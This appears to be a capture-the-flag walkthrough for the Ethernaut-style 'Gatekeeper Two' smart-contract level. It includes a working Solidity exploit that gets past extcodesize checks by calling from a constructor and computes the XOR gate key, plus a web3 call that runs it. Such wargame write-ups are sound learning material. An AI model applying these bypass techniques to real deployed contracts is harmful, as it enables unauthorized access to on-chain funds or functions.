The three gates which we are required to pass this time:
- `msg.sender != tx.origin` - the sending address must not match the origin address, this is the same as the previous level
- `extcodesize(msg.sender) == 0`
- `uint64(keccak256(msg.sender)) ^ uint64(_gateKey) == uint64(0) - 1)`

For the first gate we can just call a contract which calls the level instance. For the second gate we can put our code in a contract constructor which will mean that `extcodesize` [will return 0](https://ethereum.stackexchange.com/questions/14015/iscontract-function-using-evm-assembly-to-get-the-address-code-size). For the last gate we can trivially rearrange the equation to calculate the key when the constructor is run.

Putting all of this together we get the following contract:
```solidity
pragma solidity ^0.4.26;

interface GatekeeperTwo {
  function enter(bytes8 _gateKey) external returns (bool);
}
  
contract GKTwoProxy {
    constructor() public {
        GatekeeperTwo gk = GatekeeperTwo(0xd2eB098633CC4B8a6Be540EE607771b141BFB2eb);
        bytes32 hashed_addr = keccak256(abi.encodePacked(address(this)));
        uint64 xored = uint64(hashed_addr) ^ (uint64(0) - 1);
        bytes8 key =  bytes8(xored);
        gk.enter(key);
    }
}

contract Runner {
    function run() public {
        GKTwoProxy gk = new GKTwoProxy();
        
        // Avoid solidity complaining about unused variable
        gk;
    }
}
```

And we can run it like so:
```javascript
var c = web3.eth.contract(abi).at("0xf076d8dCf477C2518c1e43fa3d9b8731375F234F");
c.run({from: player}, ()=>{});
```
